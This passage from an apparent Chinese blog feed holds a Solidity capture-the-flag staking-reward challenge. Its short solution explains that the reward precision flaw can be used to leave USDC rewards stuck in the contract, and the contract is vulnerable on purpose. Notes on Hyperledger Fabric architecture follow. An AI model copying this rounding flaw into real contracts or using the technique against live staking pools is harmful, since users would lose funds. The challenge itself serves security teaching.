class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = msg.sender;</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) public virtual returns (bool) &#123;</span><br><span class="line">        address spender = msg.sender;</span><br><span class="line">        _spendAllowance(from, spender, value);</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        _update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">        if (from == address(0)) &#123;</span><br><span class="line">            // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">            _totalSupply += value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint256 fromBalance = _balances[from];</span><br><span class="line">            if (fromBalance &lt; value) &#123;</span><br><span class="line">                revert();</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">                _balances[from] = fromBalance - value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (to == address(0)) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">                _totalSupply -= value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.</span><br><span class="line">                _balances[to] += value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        _update(address(0), account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        _update(account, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">        _approve(owner, spender, value, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bool emitEvent</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        if (owner == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        if (spender == address(0)) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        _allowances[owner][spender] = value;</span><br><span class="line">        if (emitEvent) &#123;</span><br><span class="line">            emit Approval(owner, spender, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            if (currentAllowance &lt; value) &#123;</span><br><span class="line">                revert();</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SCTF is ERC20 &#123;</span><br><span class="line">    constructor(</span><br><span class="line">        address owner,</span><br><span class="line">        uint supply,</span><br><span class="line">        uint8 decimals</span><br><span class="line">    ) ERC20(&quot;SCTF&quot;, &quot;sctf&quot;, decimals) &#123;</span><br><span class="line">        _mint(owner, supply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract USDC is ERC20 &#123;</span><br><span class="line">    constructor(</span><br><span class="line">        address owner,</span><br><span class="line">        uint supply,</span><br><span class="line">        uint8 decimals</span><br><span class="line">    ) ERC20(&quot;USDC&quot;, &quot;usdc&quot;, decimals) &#123;</span><br><span class="line">        _mint(owner, supply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract StakingReward &#123;</span><br><span class="line">    struct Checkpoint &#123;</span><br><span class="line">        uint64 ts;</span><br><span class="line">        uint128 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 public block_timestamp;</span><br><span class="line">   // CONSTANTS/IMMUTABLES</span><br><span class="line"></span><br><span class="line">    uint256 public constant MIN_COOLDOWN_PERIOD = 1 days;</span><br><span class="line"></span><br><span class="line">    uint256 public constant MAX_COOLDOWN_PERIOD = 10 days;</span><br><span class="line"></span><br><span class="line">    ERC20 public immutable usdc;</span><br><span class="line">    ERC20 public immutable SCTF;</span><br><span class="line"></span><br><span class="line">   //state</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Checkpoint[]) public balancesCheckpoints;</span><br><span class="line"></span><br><span class="line">    Checkpoint[] public totalSupplyCheckpoints;</span><br><span class="line"></span><br><span class="line">    uint256 public periodFinish;</span><br><span class="line"></span><br><span class="line">    uint256 public rewardsDuration;</span><br><span class="line"></span><br><span class="line">    uint256 public lastUpdateTime;</span><br><span class="line"></span><br><span class="line">    uint256 public cooldownPeriod;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public userLastStakeTime;</span><br><span class="line"></span><br><span class="line">    uint256 public rewardRateUSDC;</span><br><span class="line"></span><br><span class="line">    uint256 public rewardPerTokenStoredUSDC;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public userRewardPerTokenPaidUSDC;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public rewardsUSDC;</span><br><span class="line"></span><br><span class="line">   //auth</span><br><span class="line">   </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not Owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier afterCooldown(address _account) &#123;</span><br><span class="line">        _afterCooldown(_account);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _afterCooldown(address _account) internal view &#123;</span><br><span class="line">        uint256 canUnstakeAt = userLastStakeTime[_account] + cooldownPeriod;</span><br><span class="line">        if (canUnstakeAt &gt; block_timestamp) revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //CONSTRUCTOR / INITIALIZER</span><br><span class="line"></span><br><span class="line">    constructor(address _usdc, address sctf) &#123;</span><br><span class="line">        usdc = ERC20(_usdc);</span><br><span class="line">        SCTF = ERC20(sctf);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line"></span><br><span class="line">        rewardsDuration = 5 days;</span><br><span class="line">        cooldownPeriod = 10 days;</span><br><span class="line">        block_timestamp = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //views</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        uint256 length = totalSupplyCheckpoints.length;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return length == 0 ? 0 : totalSupplyCheckpoints[length - 1].value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _account) public view returns (uint256) &#123;</span><br><span class="line">        Checkpoint[] storage checkpoints = balancesCheckpoints[_account];</span><br><span class="line">        uint256 length = checkpoints.length;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return length == 0 ? 0 : checkpoints[length - 1].value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //STAKE/UNSTAKE</span><br><span class="line"></span><br><span class="line">    function stake(uint256 _amount) external updateReward(msg.sender) &#123;</span><br><span class="line">        if (_amount == 0) return;</span><br><span class="line"></span><br><span class="line">        // update state</span><br><span class="line">        userLastStakeTime[msg.sender] = block_timestamp;</span><br><span class="line">        _addTotalSupplyCheckpoint(totalSupply() + _amount);</span><br><span class="line">        _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) + _amount);</span><br><span class="line"></span><br><span class="line">        // transfer token to this contract from the caller</span><br><span class="line">        SCTF.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unstake(</span><br><span class="line">        uint256 _amount</span><br><span class="line">    ) public updateReward(msg.sender) afterCooldown(msg.sender) &#123;</span><br><span class="line">        if (_amount == 0) return;</span><br><span class="line">        uint256 balance = balanceOf(msg.sender);</span><br><span class="line">        if (_amount &gt; balance) revert();</span><br><span class="line"></span><br><span class="line">        _addTotalSupplyCheckpoint(totalSupply() - _amount);</span><br><span class="line">        _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) - _amount);</span><br><span class="line"></span><br><span class="line">        SCTF.transfer(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //CLAIM REWARDS</span><br><span class="line"></span><br><span class="line">    function getReward() external &#123;</span><br><span class="line">        _getReward(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _getReward(address _account) internal &#123;</span><br><span class="line">        _getReward(_account, _account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _getReward(</span><br><span class="line">        address _account,</span><br><span class="line">        address _to</span><br><span class="line">    ) internal updateReward(_account) &#123;</span><br><span class="line">        uint256 rewardUSDC = rewardsUSDC[_account];</span><br><span class="line">        if (rewardUSDC &gt; 0) &#123;</span><br><span class="line">            // update state (first)</span><br><span class="line">            rewardsUSDC[_account] = 0;</span><br><span class="line"></span><br><span class="line">            // transfer token from this contract to the account</span><br><span class="line">            // as newly issued rewards from inflation are now issued as non-escrowed</span><br><span class="line">            usdc.transfer(_to, rewardUSDC);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //REWARD UPDATE CALCULATIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /// @notice update reward state for the account and contract</span><br><span class="line">    /// @param _account: address of account which rewards are being updated for</span><br><span class="line">    /// @dev contract state not specific to an account will be updated also</span><br><span class="line">    modifier updateReward(address _account) &#123;</span><br><span class="line">        _updateReward(_account);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateReward(address _account) internal &#123;</span><br><span class="line">        rewardPerTokenStoredUSDC = rewardPerTokenUSDC();</span><br><span class="line">        lastUpdateTime = lastTimeRewardApplicable();</span><br><span class="line"></span><br><span class="line">        if (_account != address(0)) &#123;</span><br><span class="line">            rewardsUSDC[_account] = earnedUSDC(_account);</span><br><span class="line"></span><br><span class="line">            userRewardPerTokenPaidUSDC[_account] = rewardPerTokenStoredUSDC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function rewardPerTokenUSDC() public view returns (uint256) &#123;</span><br><span class="line">        uint256 allTokensStaked = totalSupply();</span><br><span class="line"></span><br><span class="line">        if (allTokensStaked == 0) &#123;</span><br><span class="line">            return rewardPerTokenStoredUSDC;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return</span><br><span class="line">            rewardPerTokenStoredUSDC +</span><br><span class="line">            (((lastTimeRewardApplicable() - lastUpdateTime) *</span><br><span class="line">                rewardRateUSDC *</span><br><span class="line">                1e18) / allTokensStaked);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lastTimeRewardApplicable() public view returns (uint256) &#123;</span><br><span class="line">        return block_timestamp &lt; periodFinish ? block_timestamp : periodFinish;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function earnedUSDC(address _account) public view returns (uint256) &#123;</span><br><span class="line">        uint256 totalBalance = balanceOf(_account);</span><br><span class="line"></span><br><span class="line">        return</span><br><span class="line">            ((totalBalance *</span><br><span class="line">                (rewardPerTokenUSDC() - userRewardPerTokenPaidUSDC[_account])) /</span><br><span class="line">                1e18) + rewardsUSDC[_account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   //CHECKPOINTING VIEWS</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    function balancesCheckpointsLength(</span><br><span class="line">        address _account</span><br><span class="line">    ) external view returns (uint256) &#123;</span><br><span class="line">        return balancesCheckpoints[_account].length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupplyCheckpointsLength() external view returns (uint256) &#123;</span><br><span class="line">        return totalSupplyCheckpoints.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceAtTime(</span><br><span class="line">        address _account,</span><br><span class="line">        uint256 _timestamp</span><br><span class="line">    ) external view returns (uint256) &#123;</span><br><span class="line">        return</span><br><span class="line">            _checkpointBinarySearch(balancesCheckpoints[_account], _timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupplyAtTime(</span><br><span class="line">        uint256 _timestamp</span><br><span class="line">    ) external view returns (uint256) &#123;</span><br><span class="line">        return _checkpointBinarySearch(totalSupplyCheckpoints, _timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _checkpointBinarySearch(</span><br><span class="line">        Checkpoint[] storage _checkpoints,</span><br><span class="line">        uint256 _timestamp</span><br><span class="line">    ) internal view returns (uint256) &#123;</span><br><span class="line">        uint256 length = _checkpoints.length;</span><br><span class="line">        if (length == 0) return 0;</span><br><span class="line"></span><br><span class="line">        uint256 min = 0;</span><br><span class="line">        uint256 max = length - 1;</span><br><span class="line"></span><br><span class="line">        if (_checkpoints[min].ts &gt; _timestamp) return 0;</span><br><span class="line">        if (_checkpoints[max].ts &lt;= _timestamp) return _checkpoints[max].value;</span><br><span class="line"></span><br><span class="line">        while (max &gt; min) &#123;</span><br><span class="line">            uint256 midpoint = (max + min + 1) / 2;</span><br><span class="line">            if (_checkpoints[midpoint].ts &lt;= _timestamp) min = midpoint;</span><br><span class="line">            else max = midpoint - 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        assert(min == max);</span><br><span class="line"></span><br><span class="line">        return _checkpoints[min].value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//UPDATE CHECKPOINTS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function _addBalancesCheckpoint(address _account, uint256 _value) internal &#123;</span><br><span class="line">        _addCheckpoint(balancesCheckpoints[_account], _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addTotalSupplyCheckpoint(uint256 _value) internal &#123;</span><br><span class="line">        _addCheckpoint(totalSupplyCheckpoints, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addCheckpoint(</span><br><span class="line">        Checkpoint[] storage checkpoints,</span><br><span class="line">        uint256 _value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        uint256 length = checkpoints.length;</span><br><span class="line">        uint256 lastTimestamp;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            lastTimestamp = length == 0 ? 0 : checkpoints[length - 1].ts;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (lastTimestamp != block_timestamp) &#123;</span><br><span class="line">            checkpoints.push(</span><br><span class="line">                Checkpoint(&#123;</span><br><span class="line">                    ts: uint64(block_timestamp),</span><br><span class="line">                    value: uint128(_value)</span><br><span class="line">                &#125;)</span><br><span class="line">            );</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                checkpoints[length - 1].value = uint128(_value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> //settings</span><br><span class="line"></span><br><span class="line">    function notifyRewardAmount(</span><br><span class="line">        uint256 _rewardUsdc</span><br><span class="line">    ) external onlyOwner updateReward(address(0)) &#123;</span><br><span class="line">        if (block_timestamp &gt;= periodFinish) &#123;</span><br><span class="line">            rewardRateUSDC = _rewardUsdc / rewardsDuration;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            uint256 remaining = periodFinish - block_timestamp;</span><br><span class="line"></span><br><span class="line">            uint256 leftoverUsdc = remaining * rewardRateUSDC;</span><br><span class="line">            rewardRateUSDC = (_rewardUsdc + leftoverUsdc) / rewardsDuration;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastUpdateTime = block_timestamp;</span><br><span class="line">        periodFinish = block_timestamp + rewardsDuration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setRewardsDuration(uint256 _rewardsDuration) external onlyOwner &#123;</span><br><span class="line">        if (block_timestamp &lt;= periodFinish) revert();</span><br><span class="line">        if (_rewardsDuration == 0) revert();</span><br><span class="line"></span><br><span class="line">        rewardsDuration = _rewardsDuration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCooldownPeriod(uint256 _cooldownPeriod) external onlyOwner &#123;</span><br><span class="line">        if (_cooldownPeriod &lt; MIN_COOLDOWN_PERIOD) revert();</span><br><span class="line">        if (_cooldownPeriod &gt; MAX_COOLDOWN_PERIOD) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cooldownPeriod = _cooldownPeriod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function vm_warp(uint256 warp) public &#123;</span><br><span class="line">        if (periodFinish != 0) &#123;</span><br><span class="line">            require(block_timestamp + warp &lt;= periodFinish, &quot;error time warp&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        block_timestamp += warp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract setUp1 &#123;</span><br><span class="line">    StakingReward public staking;</span><br><span class="line">    address public player;</span><br><span class="line">    SCTF public sctf;</span><br><span class="line">    USDC public usdc;</span><br><span class="line">    bool isClaimed;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        sctf = new SCTF(address(this), 120_000e18 + 10e18, 18);</span><br><span class="line">        usdc = new USDC(address(this), 1_00e6, 6);</span><br><span class="line">        staking = new StakingReward(address(usdc), address(sctf));</span><br><span class="line">        sctf.approve(address(staking), 120_000e18);</span><br><span class="line">        staking.stake(120_000e18);</span><br><span class="line">        staking.vm_warp(1);</span><br><span class="line">        usdc.transfer(address(staking), 100e6);</span><br><span class="line">        staking.notifyRewardAmount(100e6);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function registerPlayer() public &#123;</span><br><span class="line">        require(staking.block_timestamp() != staking.periodFinish());</span><br><span class="line">        require(player == address(0), &quot;Already Registered&quot;);</span><br><span class="line">        player = msg.sender;</span><br><span class="line">        sctf.transfer(player, 10e18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(staking.block_timestamp() == staking.periodFinish());</span><br><span class="line">        require(!isClaimed);</span><br><span class="line">        staking.getReward();</span><br><span class="line">        isClaimed = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        if (</span><br><span class="line">            player != address(0) &amp;&amp;</span><br><span class="line">            isClaimed &amp;&amp;</span><br><span class="line">            (usdc.balanceOf(address(this)) &lt; 1e6)</span><br><span class="line">        ) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>知识点：舍入问题 </p>
<p>解析：由于奖励代币USDC精度较小，仅有6位小数，并且总质押量大，因此在奖励计算时如果相隔时间小由于精度损失会让让 rewardPerTokenStoredUSDC不会增加，导致奖励代币被卡在合约中不能分发。</p>
<p>因此只需要频繁调用合约中的函数来更新rewardPerTokenStoredUSDC就可完成题目</p>
]]></content>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>链原——Fabric</title>
    <url>/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94Fabric/</url>
    <content><![CDATA[<h2 id="超级账本Fabric"><a href="#超级账本Fabric" class="headerlink" title="超级账本Fabric"></a>超级账本Fabric</h2><h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><ul>
<li><p><strong>引入了部分中心化服务节点。</strong></p>
</li>
<li><p><strong>为了满足联盟链跨组织多业务协同的需求，超级账本Fabric区块链系统提供了多通道机制，可以同时建立多个逻辑上独立、相互隔离的区块链，每个通道对应唯一的区块链与账本</strong></p>
</li>
<li><p><strong>提供了链码（Chaincode）机制，实现比以太坊智能合约更灵活、强大的智能合约功能，每个节点都可以部署运行链码，链码将存储于区块链中，加载到每个Peer节点上的轻量化Docker容器中执行。</strong></p>
<p>【1】</p>
</li>
</ul>
<h3 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a>系统逻辑架构</h3><p>【2】</p>
<blockquote>
<p>超级账本Fabric系统不提供加密数字货币功能，因此没有激励层</p>
</blockquote>
<p><strong>系统系统的存储层主要采用文件系统、LevelDB或可选的CouchDB Key-Value数据库，为超级账本Fabric系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务。</strong></p>
<p><strong>系统的数据层是系统核心功能层级之一，对超级账本Fabric系统核心的区块、区块链、交易、账本、地址、世界状态等关键数据结构进行定义和处理，负责将交易打包进区块，由区块组成区块链，并构建了世界状态、区块索引、键历史索引等数据结构，并基于底层的存储服务提供对超级账本Fabric区块链数据的安全读写访问管理。</strong></p>
<p><strong>系统的网络层是系统核心功能层级之一，主要采用非结构化P2P网络，基于Gossip P2P网络协议，实现网络节点快速发现与连接，以及区块、交易数据的分发与同步，为超级账本Fabric系统各网络节点之间提供节点发现与安全连接通信机制，为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。</strong></p>
<p><strong>系统的共识层是系统核心功能层级之一，由于超级账本Fabric系统不提供加密货币发行和激励机制，因此共识层不需要采用类似比特币、以太坊等系统的PoW竞争计算共识机制，系统默认提供Solo&#x2F;Kafka等多种可选的共识排序服务，并提供对共识机制进行扩展的接口，允许自定义扩展共识服务插件。</strong></p>
<p><strong>系统的合约层采用链码（Chaincode）实现智能合约功能，链码支持Go、Java、Node.js等多种开发技术实现，提供了比以太坊系统更丰富的链码开发API接口，可在链码中实现对区块链和账本更复杂的业务操作逻辑，同时采用更轻量和开发的Docker容器技术实现链码的安全、高效运行。</strong></p>
<p><strong>系统的接口层提供了基于JSON RPC、Web3.js的SDK接口和命令行接口。</strong></p>
<p><strong>系统的应用层基于接口层提供的灵活多样的SDK接口，可以实现面向各种应用场景和业务逻辑的企业级联盟链或私有链应用。</strong></p>
<h3 id="数据层"><a href="#数据层" class="headerlink" title="数据层"></a>数据层</h3><p><strong>在超级账本Fabric系统中，第一个创世区块不包含任何交易数据，从第二个区块开始，每个区块由区块头（Block Header）、区块数据（Block Data）、区块元数据（Block Metadata）等部分组成，将所有不可改变的、有序的交易记录存放在区块数据中，每个区块由区块数据的哈希值唯一标识，每个区块都保存了前一个区块的区块哈希值，所有区块链接在一起构成区块链。</strong></p>
<p><strong>每个区块的区块头包含区块编号（BlockNumber）、当前区块的哈希（CurrentBlockHash）、父区块的哈希（PreviousBlockHash）等3个字段，如图所示。</strong></p>
<p>【3】</p>
<p>【4】</p>
<p><strong>每个区块的区块数据域包含记录到该区块中的多条交易数据，如图所示。区块数据域中所有交易数据的哈希计算结果将作为当前区块哈希保存到区块头中。每个区块的元数据域包含了区块的创建时间、区块创建节点的证书及公钥、区块创建节点的数字签名等信息。</strong></p>
<p>【5】</p>
<h4 id="账本数据"><a href="#账本数据" class="headerlink" title="账本数据"></a>账本数据</h4><p><strong>超级账本Fabric系统区块链每个通道都会拥有一个独立的分布式账本，每个账本由区块链（Blockchain）、状态数据库（State Database）、区块索引库（Block Index Database）、键历史索引库（Key History Index Database）等要素构成。其中，区块链和状态数据库是两个最重要的组成部分，如图所示。</strong></p>
<p>【6】</p>
<p><strong>状态数据库</strong></p>
<p>​    状态数据库又称为“世界状态（World State）”，状态数据库实际上存储的是所有曾经在交易中出现的写操作相关的键值对的最新值。超级账本Fabric系统采用CouchDB或LevelDB数据库来构建状态数据库。</p>
<p><strong>区块索引库</strong></p>
<p>​    区块索引库提供了对区块进行快读定位查找的索引信息（区块存储文件位置指针），可以通过区块序号、区块哈希、交易ID、区块序号+交易序号等查询条件快速查找区块，类似于关系型数据库中的索引表。超级账本Fabric系统采用LevelDB数据库来构建区块索引库。</p>
<p><strong>键历史索引库</strong></p>
<p>​    键历史索引库记录引起区块链系统状态改变的键值对&lt;key, value&gt;数据的历史信息，可用于查询某个 key 的历史修改记录，但是并不存储key具体的值，而只记录在哪个区块的哪个交易里，对key的值进行了修改。超级账本Fabric系统采用LevelDB数据库来构建键历史索引库。</p>
<h4 id="交易数据"><a href="#交易数据" class="headerlink" title="交易数据"></a>交易数据</h4><p>在超级账本Fabric系统中，键历史索引库记录引起区块链系统状态改变的键值对&lt;key, value&gt;数据的历史信息，可用于查询某个 key 的历史修改记录，但是并不存储key具体的值，而只记录在哪个区块的哪个交易里，对key的值进行了修改。</p>
<p><strong>(1)</strong> <strong>交易头（Header）</strong></p>
<p>​    <strong>交易头包含与交易相关的必不可少的元数据，包括交易ID、交易类型、交易发出时间、通道ID、链码名称及其版本等字段。</strong></p>
<p><strong>(2)</strong> <strong>交易签名（Signature）</strong></p>
<p>​    <strong>交易签名字段包含交易创建者客户端应用程序的公钥与数字签名，用于检查交易内容是否被篡改。</strong></p>
<p><strong>(3)</strong> <strong>交易提案（Proposal）</strong></p>
<p>​    <strong>交易提案字段是客户端应用程序发出的创建交易提案的参数编码后的结果，包含要调用的链码（超级账本的智能合约）的方法名称、调用方法所需的输入参数，链码根据交易提案的输入参数对区块链系统状态和账本数据进行更新。</strong></p>
<p><strong>(4)</strong> <strong>交易响应（Response）</strong></p>
<p>​    <strong>交易响应是链码被调用后返回给发起交易的客户端的输出结果，即区块链系统状态（世界状态）改变前、后的键值对&lt;key, value&gt;数据，具体分为读集合（ReadSet）与写集合值（WriteSet）。</strong></p>
<p><strong>(5)</strong> <strong>背书列表（Endorsement）</strong></p>
<p>​    <strong>背书列表包括达到背书策略规定的足够多的背书节点的公钥与数字签名，用于检查哪些组织对该交易进行背书，防止抵赖。</strong></p>
<p><strong>系统的账本数据包含两个最重要的组成部分——区块链和状态数据库。</strong></p>
<p><strong>状态数据库又称为“世界状态”。每个交易实质上都是通过调用智能合约（即链码），提交一系列与交易相关的键值对&lt;key, value&gt;数据的读、写（增、删、改）操作，可分为对键值对&lt;key, value&gt;数据的读集合和写集合，其中读操作不会改变区块链系统状态和账本数据，而写操作会改变区块链系统的状态和账本数据。</strong></p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p><strong>主要提供以下网络管理功能：</strong></p>
<p>  <strong>(1)</strong> <strong>区块链P2P网络的组网与通道管理</strong></p>
<p>  <strong>(2)</strong> <strong>各网络节点的节点发现、安全连接与通信管理</strong></p>
<p>  <strong>(3)</strong> <strong>新区块或交易数据广播与验证管理</strong></p>
<p>  <strong>(4)</strong> <strong>各网络节点之间区块链及账本数据同步管理</strong></p>
<p>超级账本Fabric系统大部分网络结构属于非结构化P2P网络，但是保留了部分中心化功能节点（<strong>Orderer排序节点</strong>）。</p>
<h4 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h4><p>【7】</p>
<p><strong>(1)</strong> <strong>Peer对等节点</strong></p>
<p> 超级账本Fabric系统的Peer节点是组建P2P网络的真正意义上的对等节点，Peer节点可以具有记账（Committer）、背书（Endorser）、主节点（Leader）、锚节点（Anchor）等不同的功能角色。其中每个Peer节点一定具有记账功能角色，即Peer节点都可以对区块链与账本进行写入操作，当Peer节点接收到Orderer节点的新区块广播时，会对区块数据进行校验后写入本地区块链和账本中。</p>
<p>在超级账本Fabric系统中，Peer节点默认的网络服务端口如下：</p>
<p>• Peer节点P2P连接服务端口7051</p>
<p>• Peer节点链码连接请求监听端口7052</p>
<p>• Peer节点事件服务监听端口7053</p>
<p>• Peer节点CouchDB数据库服务端口5984</p>
<p><strong>(2)Orderer排序节点</strong></p>
